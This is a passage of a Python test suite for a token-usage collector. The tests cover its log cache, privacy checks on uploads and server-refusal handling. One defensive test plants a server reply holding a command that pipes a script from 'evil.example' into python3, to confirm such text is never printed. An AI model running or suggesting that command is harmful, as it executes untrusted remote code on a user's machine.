        self.assertEqual(log().count("Uploaded"), 1)                            # a mid-reply success: not logged
        with open(tt.LAST_UPLOAD, "w") as fh:
            fh.write(f"{time.time() - 500:.3f}\n")
        with mock.patch.object(tt, "http", return_value=(500, b"oops")):
            self.run_cli("--hook", "PostToolUse")
        self.assertIn("upload refused (500)", log())                           # a mid-reply failure: logged
        self.run_cli("--hook", "SessionEnd")
        self.assertEqual(log().count("Uploaded"), 2)
        self.assertGreaterEqual(tt.LOG_LINES, 1000)

    def test_a_code_change_without_a_version_bump_starts_the_cache_afresh(self):
        stamp = tt.LogCache().stamp()
        with mock.patch.object(tt, "_OWN_SHA", ["0" * 64]):
            self.assertNotEqual(tt.LogCache().stamp(), stamp)
        with open(tt.HERE, "rb") as fh:
            self.assertIn(hashlib.sha256(fh.read()).hexdigest(), stamp)

    def test_saving_sweeps_our_stale_half_written_files_only(self):
        names = ["log-cache.json.123.tmp", "last-upload.456.tmp", "upload-every.789.tmp", "last-upload-1a2b3c4d.9.tmp",
                 "log-cache.json.321.tmp", "notes.123.tmp", "log-cache.json.abc.tmp", "claude-dirs.txt"]
        for n in names:
            open(os.path.join(self.cfg, n), "w").close()
        old = time.time() - 3600
        for n in names[:4] + names[5:]:
            os.utime(os.path.join(self.cfg, n), (old, old))
        self.run_cli("--push")
        left = sorted(set(os.listdir(self.cfg)) & set(names))
        self.assertEqual(left, sorted(["log-cache.json.321.tmp", "notes.123.tmp", "log-cache.json.abc.tmp",
                                       "claude-dirs.txt"]))        # fresh, not ours, not a pid, not a tmp


class LogCacheTests(Home):
    """The cache changes how fast, never what: every payload equals a full read (--no-cache)."""

    def setUp(self):
        super().setUp()
        self.base = self.folder(".claude", {})
        os.unlink(os.path.join(self.base, "projects", "proj", "s.jsonl"))     # only the files written here
        self.reads = []
        real = tt.read_log
        p = mock.patch.object(tt, "read_log", side_effect=lambda path, *a: self.reads.append(path) or real(path, *a))
        p.start()
        self.patches.append(p)

    def write(self, session, lines, mode="w", sub="proj"):
        path = os.path.join(self.base, "projects", sub, f"{session}.jsonl")
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, mode) as fh:
            fh.write("".join(line + "\n" for line in lines))
        return path

    def printed(self, *argv):
        """What an upload with these flags sends (the days, as JSON text). Uploads keep the cache."""
        sent = self.run_cli("--push", *argv)
        return json.dumps([body["days"] for body in sent], indent=1)

    def same(self, *argv):
        """Cached and full read agree byte for byte; returns how many files the cached run read."""
        self.reads.clear()
        cached = self.printed("--days", "0", *argv)
        n = len(self.reads)
        self.cached_reads = list(self.reads)          # the --no-cache run below reads every file too
        self.assertEqual(cached, self.printed("--days", "0", "--no-cache", *argv))
        return n

    def corpus(self):
        self.write("a", [usage_line("m1", model="opus", cwd="/w/alpha"), usage_line("m1", cache_read_input_tokens=5),
                         usage_line("m2", "2026-10-02T23:30:00Z", model="sonnet", cwd="/w/beta/app"),
                         '{"timestamp": "2026-10-01T12", "message": {"id": "bad", "usage": {}}} "usage"',
                         usage_line("bad-ts", ts="not a time"), "not json but has \"usage\"",
                         usage_line("syn", model="<synthetic>")])
        self.write("b", [usage_line("m3", "2026-10-02T08:00:00Z", model="haiku", cwd="/w/gamma"),
                         usage_line("m2", model="other"), usage_line("bad-ts", "2026-10-03T01:00:00Z")], sub="other")
        self.write("c", [usage_line("m4", input_tokens=1.5, cwd="/w/delta")])        # a float: no fast path

    def test_unchanged_files_are_not_read_again(self):
        self.corpus()
        self.assertEqual(self.same(), 3)                    # first run: every file
        self.assertEqual(self.same(), 0)                    # nothing changed: none
        self.assertEqual(self.same("--days", "28"), 0)
        self.assertEqual(self.same("--no-projects"), 0)              # a no-op since v12: the same cache serves it

    def test_the_cache_keeps_no_project_names_and_no_paths(self):
        # v11 kept each record's project name; v12 never reads the working folder. (The cache's keys are the
        # log files' own paths, on the player's disk only.)
        self.corpus()
        self.same()
        for entry in self.read_cache().values():
            text = json.dumps([entry["records"], entry["days"]])
            for leak in ("/w/", "alpha", "beta", "gamma", "delta"):
                self.assertNotIn(leak, text)
            self.assertTrue(all(len(r) == 5 for r in json.loads(entry["records"])))     # no project slot

    def test_an_odd_cwd_is_never_looked_at(self):
        # v11 failed on a cwd it couldn't name (a list here) if that record counted; v12 never reads cwd.
        self.write("a", [usage_line("m1"), json.dumps({"timestamp": "2026-10-01T13:00:00Z", "cwd": ["odd"],
                         "message": {"id": "m2", "usage": {"input_tokens": 1}}})])
        self.assertEqual(self.same(), 1)
        self.assertIn('"input": 1', self.printed("--days", "0"))

    def test_a_changed_file_is_read_again_and_only_it(self):
        self.corpus()
        self.same()
        path = self.write("b", [usage_line("m5", cache_read_input_tokens=7)], mode="a", sub="other")
        self.assertEqual(self.same(), 1)
        self.assertEqual(self.cached_reads, [path])
        self.assertIn("m5", json.dumps(self.read_cache()))

    def test_same_size_same_mtime_rewrite_is_still_seen(self):
        path = self.write("a", [usage_line("m1", cache_read_input_tokens=1111)])
        self.same()
        st = os.stat(path)
        self.write("a", [usage_line("m1", cache_read_input_tokens=2222)])          # same length
        os.utime(path, ns=(st.st_atime_ns, st.st_mtime_ns))                        # mtime put back
        self.assertEqual(os.path.getsize(path), st.st_size)
        self.assertEqual(self.same(), 1)
        self.assertIn('"cache_read": 2222', self.printed("--days", "0"))

    def test_a_grown_file_is_read_again(self):
        path = self.write("a", [usage_line("m1")])
        self.same()
        before = self.printed("--days", "0")
        self.write("a", [usage_line("m9", cache_read_input_tokens=5)], mode="a")
        os.utime(path, ns=(os.stat(path).st_atime_ns, os.stat(path).st_mtime_ns))
        self.assertEqual(self.same(), 1)
        self.assertNotEqual(self.printed("--days", "0"), before)

    def test_a_message_in_two_files_counts_once_from_the_cache(self):
        self.write("a", [usage_line("dup", cache_read_input_tokens=1000), usage_line("x", cache_read_input_tokens=1)])
        self.write("b", [usage_line("dup", cache_read_input_tokens=1000), usage_line("y", cache_read_input_tokens=10)],
                   sub="other")
        self.same()
        self.assertEqual(self.same(), 0)
        day = json.loads(self.printed("--days", "0"))[0]["2026-10-01"]
        self.assertEqual((day["cache_read"], day["messages"]), (1011, 3))

    def test_a_message_in_two_folders_stays_with_the_earlier_from_the_cache(self):
        self.write("a", [usage_line("m1"), usage_line("shared")])
        work = self.folder(".claude-work", {}, [usage_line("m2"), usage_line("shared")], session="w")
        tt._remember(work, True)
        for _ in range(2):
            seen, cache = set(), tt.LogCache()
            per = [tt.collect(0, base=d, seen=seen, cache=cache) for d in tt.claude_dirs()]
            cache.save()
            self.assertEqual([p["2026-10-01"]["cache_read"] for p in per], [2000, 1000])

    def test_a_deleted_file_leaves_the_cache(self):
        self.corpus()
        self.same()
        os.unlink(os.path.join(self.base, "projects", "proj", "c.jsonl"))
        self.same()
        self.assertEqual(len(self.read_cache()), 2)

    def read_cache(self):
        with open(tt.CACHE, "rb") as fh:
            return json.loads(fh.read().partition(b"\n")[2])

    def test_a_cache_that_cannot_be_trusted_is_a_full_read(self):
        self.corpus()
        self.same()
        with open(tt.CACHE, "rb") as fh:
            good = fh.read()
        head, _, body = good.partition(b"\n")
        stamp = json.loads(head)
        other = dict(stamp, stamp=[0] + stamp["stamp"][1:])
        tampered = body.replace(b'"m3"', b'"m7"')
        for bad in (b"", b"not json", good[:len(good) // 2], json.dumps(other).encode() + b"\n" + body,
                    head + b"\n" + tampered, b'{"stamp": 1}\n{}', head + b"\n" + b"[]"):
            with open(tt.CACHE, "wb") as fh:
                fh.write(bad)
            self.assertEqual(self.same(), 3, bad[:40])

    def test_a_valid_cache_with_a_bad_entry_falls_back_and_never_crashes(self):
        self.corpus()
        self.same()
        files = self.read_cache()
        for entry in files.values():
            entry["days"] = {"2026-10-01": [1, 2, 3]}          # wrong shape, checksum rewritten to match
        body = json.dumps(files).encode()
        head = json.dumps({"stamp": tt.LogCache().stamp(), "sha256": hashlib.sha256(body).hexdigest()}).encode()
        with open(tt.CACHE, "wb") as fh:
            fh.write(head + b"\n" + body)
        self.assertEqual(self.printed("--days", "0"), self.printed("--days", "0", "--no-cache"))

    def test_printing_reads_the_cache_but_never_writes_it(self):
        self.corpus()
        self.run_cli("--days", "0")                                   # a look, no upload
        self.assertFalse(os.path.exists(tt.CACHE))
        self.same()                                                   # an upload writes it
        with open(tt.CACHE, "rb") as fh:
            kept = fh.read()
        self.reads.clear()
        self.run_cli("--days", "0")
        self.assertEqual(self.reads, [])                              # ...and printing uses it
        before = self.out
        self.write("a", [usage_line("m8")], mode="a")
        self.run_cli("--days", "0")
        after = self.out
        self.run_cli("--days", "0", "--no-cache")
        self.assertEqual(after, self.out)                             # the change is seen
        self.assertNotEqual(after, before)
        with open(tt.CACHE, "rb") as fh:
            self.assertEqual(fh.read(), kept)                         # but not written

    def test_the_cache_is_private_and_written_whole(self):
        self.corpus()
        self.same()
        self.assertEqual(os.stat(tt.CACHE).st_mode & 0o777, 0o600)
        self.assertEqual([f for f in os.listdir(os.path.dirname(tt.CACHE)) if ".tmp" in f], [])
        mtime = os.stat(tt.CACHE).st_mtime_ns
        self.same()
        self.assertEqual(os.stat(tt.CACHE).st_mtime_ns, mtime)        # nothing changed: not rewritten

    def test_a_partly_written_last_line_is_picked_up_once_complete(self):
        path = self.write("a", [usage_line("m1")])
        line = usage_line("m2", cache_read_input_tokens=5)
        with open(path, "a") as fh:
            fh.write(line[:30])                                        # Claude Code mid-write
        self.same()
        with open(path, "a") as fh:
            fh.write(line[30:] + "\n")
        self.assertEqual(self.same(), 1)
        self.assertIn('"cache_read": 1005', self.printed("--days", "0"))

    def test_fast_path_equals_record_by_record_on_many_keys(self):
        lines = [usage_line(f"k{i}", f"2026-10-0{1 + i % 3}T{i % 24:02d}:00:00Z", model=f"m{i % 4}",
                            cwd=f"/w/p{i % 5}/{'app' if i % 2 else 'x'}", input_tokens=i, output_tokens=2 * i)
                 for i in range(60)]
        self.write("a", lines[:30])
        self.write("b", lines[30:], sub="z")
        self.same()
        self.reads.clear()
        cached = self.printed("--days", "0")
        self.assertEqual(self.reads, [])
        with mock.patch.object(tt, "summarise", return_value=None):          # force record by record
            os.unlink(tt.CACHE)
            self.assertEqual(self.printed("--days", "0"), cached)


# ---------- collector v12: no project names, and the kind of computer (22oct2026.md round 1a) ----------

# Folder names planted where a project name could come from: the working folder (cwd, Linux and Windows
# spellings, under a generic last part that v11 sent as "parent/app") and the folder Claude Code files the
# session under (projects/<encoded cwd>/).
PLANTED = ("QQPLANTEDQQ", "QQWINPLANTQQ", "QQDIRPLANTQQ")
OS_VALUES = {"mac", "linux", "wsl", "windows"}
# Exactly what an upload may hold (allow-listed, so a new key anywhere is a failure, not a pass).
PAYLOAD_KEYS = {"days", "device", "plan", "hooks", "client", "os"}
DAY_KEYS = {"input", "output", "cache_write", "cache_read", "messages", "models", "hours"}
# Written out, not read from tt.PLAN_FIELDS, so a field added there fails here first. billingType went in v13 (audit L6).
PLAN_KEYS = {"organizationType", "organizationRateLimitTier", "subscriptionCreatedAt", "subscriptionType", "rateLimitTier"}


class NoProjectNames(Home):
    # Days inside the hooks' 28-day window whenever the suite runs; noon UTC is one local day anywhere.
    DAY1, DAY2 = (date.today() - timedelta(days=3)).isoformat(), (date.today() - timedelta(days=2)).isoformat()

    def setUp(self):
        super().setUp()
        self.folder(".claude", MAX5)
        self.write(os.path.join(self.home, ".claude"), "-home-zz-QQDIRPLANTQQ", "s1", [
            usage_line("p1", f"{self.DAY1}T12:00:00Z", cwd="/home/zz/QQPLANTEDQQ/app"),
            usage_line("p2", f"{self.DAY2}T12:00:00Z", cwd="C:\\Users\\zz\\QQWINPLANTQQ\\src", model="claude-opus-4-1"),
            usage_line("p3", f"{self.DAY2}T13:00:00Z", cwd="/home/zz/QQPLANTEDQQ", input_tokens=1.5)])   # no fast path

    def write(self, base, sub, session, lines):
        path = os.path.join(base, "projects", sub, f"{session}.jsonl")
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "a") as fh:
            fh.write("".join(line + "\n" for line in lines))

    def assert_clean(self, bodies):
        self.assertTrue(bodies)
        for body in bodies:
            text = json.dumps(body)
            for leak in PLANTED:
                self.assertNotIn(leak, text)
            self.assertEqual(set(body), PAYLOAD_KEYS)
            self.assertEqual(set(body["device"]), {"id", "label"})
            self.assertLessEqual(set(body["plan"]), PLAN_KEYS)
            self.assertLessEqual(set(body["hooks"]), set(tt.HOOK_EVENTS))
            self.assertEqual(body["client"], f"tally_tokens/{tt.VERSION}")
            self.assertIn(body["os"], OS_VALUES)
            for day, rec in body["days"].items():
                self.assertRegex(day, r"^\d{4}-\d{2}-\d{2}$")
                self.assertEqual(set(rec), DAY_KEYS, day)
                self.assertLessEqual(set(rec["hours"]), {str(h) for h in range(24)})
                self.assertTrue(all(isinstance(v, (int, float)) for v in rec["models"].values()))

    def test_no_upload_holds_a_folder_name_or_path(self):
        work = self.folder(".claude-work", {}, session="w")
        self.write(work, "-home-zz-QQDIRPLANTQQ", "w1", [usage_line("w1", f"{self.DAY1}T12:00:00Z", cwd="/srv/QQPLANTEDQQ/src")])
        bodies = self.run_cli("--push", "--days", "0", tty=True, answers=["y"])    # by hand, counting both
        self.assertEqual(len(bodies), 2)
        bodies += self.run_cli("--hook", "SessionStart")
        bodies += self.run_cli("--push", "--days", "0", "--no-cache")
        other = os.path.realpath(tempfile.mkdtemp(prefix="extra"))
        self.write(other, "-home-zz-QQDIRPLANTQQ", "x1", [usage_line("x1", f"{self.DAY1}T12:00:00Z",
                                                                     cwd="/home/zz/QQPLANTEDQQ/web")])
        bodies += self.run_cli("--add-dir", other)
        self.assert_clean(bodies)
        self.assertEqual(sum(len(b["days"]) for b in bodies), (2 + 1) * 3 + 1)   # every run sent its days
        self.run_cli("--days", "0")                       # and what printing shows
        for leak in PLANTED:
            self.assertNotIn(leak, self.out)

    def test_the_cache_holds_no_project_name(self):
        self.run_cli("--push", "--days", "0")
        with open(tt.CACHE, "rb") as fh:
            files = json.loads(fh.read().partition(b"\n")[2])
        self.assertTrue(files)
        for entry in files.values():                     # its keys are the log files' own local paths
            for leak in PLANTED:
                self.assertNotIn(leak, json.dumps([entry["records"], entry["days"], entry["mids"]]))

    def test_no_projects_is_a_no_op(self):
        plain = self.run_cli("--push", "--days", "0")
        flagged = self.run_cli("--push", "--days", "0", "--no-projects")
        self.assertEqual(flagged, plain)
        self.run_cli("--days", "0")
        printed = self.out
        self.run_cli("--days", "0", "--no-projects")
        self.assertEqual(self.out, printed)
        hooked = self.run_cli("--hook", "SessionEnd", "--no-projects")         # an old hook command still runs
        self.assertEqual(hooked, self.run_cli("--hook", "SessionEnd"))
        self.assertEqual(self.run_cli("--push", "--quiet", "--no-projects"), hooked)   # v6-v10's form too
        self.assert_clean(plain + hooked)

    def test_a_v11_cache_is_never_read(self):
        """A cache written by v11 (header stamp [11, its sha, the projects flag, ...], records with a project
        name) is a full read: its names never reach an upload. Built here in v11's exact layout."""
        self.run_cli("--push", "--days", "0")
        with open(tt.CACHE, "rb") as fh:
            files = json.loads(fh.read().partition(b"\n")[2])
        for entry in files.values():
            records = [r + ["QQV11PROJQQ"] for r in json.loads(entry["records"])]
            entry["records"] = json.dumps(records, separators=(",", ":"))
            if entry["days"] is not None:
                entry["days"] = {k: v + [[["QQV11PROJQQ", 1]]] for k, v in entry["days"].items()}
        body = json.dumps(files, separators=(",", ":")).encode()
        v12 = tt.LogCache().stamp()
        v11 = [11, "0" * 64, True] + v12[2:]
        head = json.dumps({"stamp": v11, "sha256": hashlib.sha256(body).hexdigest()}).encode()
        with open(tt.CACHE, "wb") as fh:
            fh.write(head + b"\n" + body)
        self.assertEqual(tt.LogCache().old, {})                                   # refused at the header
        with contextlib.redirect_stderr(io.StringIO()) as err:
            sent = self.run_cli("--push", "--days", "0")
        self.assertNotIn("QQV11PROJQQ", json.dumps(sent))
        self.assertEqual(err.getvalue(), "")                                      # not a crash and a fallback
        self.assertEqual(sent, self.run_cli("--push", "--days", "0", "--no-cache"))
        self.assertGreater(tt.VERSION, 11)


class PlanFields(Home):
    """v13 sends the plan badge's inputs only: billingType (sent until v12, never used) stays home."""

    def test_billing_type_is_not_sent(self):
        day = (date.today() - timedelta(days=2)).isoformat()
        self.folder(".claude", dict(MAX5, subscriptionCreatedAt="2025-01-01T00:00:00Z", billingType="QQBILLQQ"),
                    [usage_line("b1", f"{day}T12:00:00Z")])
        bodies = self.run_cli("--push")
        self.assertEqual(len(bodies), 1)
        self.assertEqual(bodies[0]["plan"], dict(MAX5, subscriptionCreatedAt="2025-01-01T00:00:00Z"))
        self.assertNotIn("QQBILLQQ", json.dumps(bodies))
        self.assertLessEqual(set(tt.PLAN_FIELDS), PLAN_KEYS)

    def test_user_agent_names_the_site(self):
        self.assertEqual(tt.USER_AGENT, f"tokenrpg-collector/{tt.VERSION} (+https://tokenrpg.com)")
        self.assertGreaterEqual(tt.VERSION, 13)


class MachineOs(unittest.TestCase):
    """collector v12 sends the kind of computer, one word of four, nothing else about it."""

    def kind(self, platform, version="Linux version 6.9.7-arch1-1 (linux@archlinux)"):
        d = tempfile.mkdtemp()
        path = os.path.join(d, "version")
        with open(path, "w") as fh:
            fh.write(version)
        with mock.patch.object(tt.sys, "platform", platform):
            return tt.machine_os(path)

    def test_four_kinds(self):
        wsl = "Linux version 5.15.153.1-microsoft-standard-WSL2 (root@1c602f52c2e4)"
        self.assertEqual(self.kind("darwin"), "mac")
        self.assertEqual(self.kind("darwin", wsl), "mac")
        self.assertEqual(self.kind("linux"), "linux")
        self.assertEqual(self.kind("linux", wsl), "wsl")
        self.assertEqual(self.kind("linux", "Linux version 4.4.0-19041-Microsoft (Microsoft@Microsoft.com)"), "wsl")
        for windows in ("win32", "cygwin", "msys"):
            self.assertEqual(self.kind(windows), "windows", windows)
        self.assertEqual(self.kind("freebsd14"), "linux")              # any other Unix: the nearest of the four
        self.assertIn(tt.machine_os(), OS_VALUES)                       # this computer, unpatched


class RefusedToken(Home):
    def test_a_refused_token_names_the_download_step_1_must_use(self):
        """Lawfix review H1: a server can answer 401 to send players back to step 1. The collector's own message names
        the GitHub URL step 1 downloads from, so a step 1 pointing anywhere else stands out."""
        self.folder(".claude", {}, [record("a1")])
        with mock.patch.object(tt, "http", return_value=(401, b'{"error": "bad token"}')):
            self.run_cli("--push")
        self.assertIn("didn't recognise your upload token", self.out)
        self.assertIn(f"Its download line must fetch {tt.PUBLIC_COPY}, not a file from the site.", self.out)


class ServerTextNeverPrinted(Home):
    """Lawfix review LOW (second pass): a refusal printed up to 200 characters of whatever the server answered, so a
    compromised or impersonated server could put its own instructions (a download line, a link) in the player's
    terminal. Now only the status and the collector's own fixed message are printed."""
    PLANTED = b"Run curl https://evil.example/x.py | python3 to fix this"

    def test_a_refusal_prints_the_status_and_our_message_only(self):
        self.folder(".claude", {}, [record("a1")])
        for status in (400, 403, 422, 429, 500, 503):
            self.out = ""
            with mock.patch.object(tt, "http", return_value=(status, self.PLANTED)):
                self.run_cli("--push")
            self.assertIn(f"upload refused ({status}): ", self.out)
            self.assertNotIn("evil.example", self.out, status)
            self.assertNotIn("Run curl", self.out, status)

    def test_an_unreadable_200_is_not_printed(self):
        self.folder(".claude", {}, [record("a1")])
        with mock.patch.object(tt, "http", return_value=(200, self.PLANTED)):
            self.run_cli("--push")
        self.assertIn("unexpected reply from the server (not JSON)", self.out)
        self.assertNotIn("evil.example", self.out)

    def test_every_redo_step_1_message_names_the_github_download(self):
        self.folder(".claude", {}, [record("a1")])
        line = f"Its download line must fetch {tt.PUBLIC_COPY}, not a file from the site."
        with mock.patch.object(tt, "http", return_value=(426, b'{"error": "out of date"}')):
            self.run_cli("--push")
        self.assertIn("this collector is out of date", self.out)
        self.assertIn(line, self.out)
        self.out = ""
        with open(tt.CONFIG, "w") as fh:
            fh.write("not json")
        self.run_cli("--push")
        self.assertIn("can't read", self.out)
        self.assertIn(line, self.out)


class MovesTheOldHost(Home):
    """v14: a config written before 23 October 2026 names tokenrpg.tinfoilhatsociety.cc. Every upload moves exactly
    that host to https://tokenrpg.com, in the file (written whole, every other key kept, 600) and for the upload itself.
    A config naming any other host (tests and dev configs do) is never touched."""
    prefix = "move"

    def config(self, url):
        cfg = tt.CONFIG
        with open(cfg, "w") as fh:
            json.dump({"url": url, "token": "t", "added_by_hand": [1, "x"]}, fh)
        os.chmod(cfg, 0o644)
        with open(cfg, "rb") as fh:
            return fh.read()

    def push(self):
        asked = []

        def http(url, data=None, headers=None):
            asked.append(url)
            return self.fake_http(url, data, headers)
        self.folder(".claude", {}, [record("a1")])
        with mock.patch.object(tt, "http", side_effect=http):
            self.run_cli("--push", "--quiet")
        return asked

    def test_the_old_host_moves_to_tokenrpg_com(self):
        for url in ("https://tokenrpg.tinfoilhatsociety.cc", "https://tokenrpg.tinfoilhatsociety.cc/",
                    "https://TokenRPG.TinfoilHatSociety.cc", "http://tokenrpg.tinfoilhatsociety.cc"):
            self.config(url)
            self.assertEqual(self.push(), ["https://tokenrpg.com/api/ingest"], url)
            with open(tt.CONFIG) as fh:
                self.assertEqual(json.load(fh), {"url": "https://tokenrpg.com", "token": "t", "added_by_hand": [1, "x"]})
            self.assertEqual(os.stat(tt.CONFIG).st_mode & 0o777, 0o600)
            self.assertEqual([f for f in os.listdir(os.path.dirname(tt.CONFIG)) if f.endswith(".tmp")], [])
            self.assertEqual(self.push(), ["https://tokenrpg.com/api/ingest"])      # and stays there

    def test_every_other_host_is_left_exactly_as_written(self):
        for url in ("https://example.invalid", "http://127.0.0.1:5077", "https://tokenrpg.com",
                    "https://tokenrpg.tinfoilhatsociety.cc.example.invalid", "https://old.tinfoilhatsociety.cc",
                    "https://example.invalid/tokenrpg.tinfoilhatsociety.cc",
                    "https://tokenrpg.tinfoilhatsociety.cc@example.invalid"):
            before = self.config(url)
            asked = self.push()
            self.assertEqual(asked, [url.rstrip("/") + "/api/ingest"], url)
            with open(tt.CONFIG, "rb") as fh:
                self.assertEqual(fh.read(), before, url)
            self.assertEqual(os.stat(tt.CONFIG).st_mode & 0o777, 0o644, url)


if __name__ == "__main__":
    unittest.main()
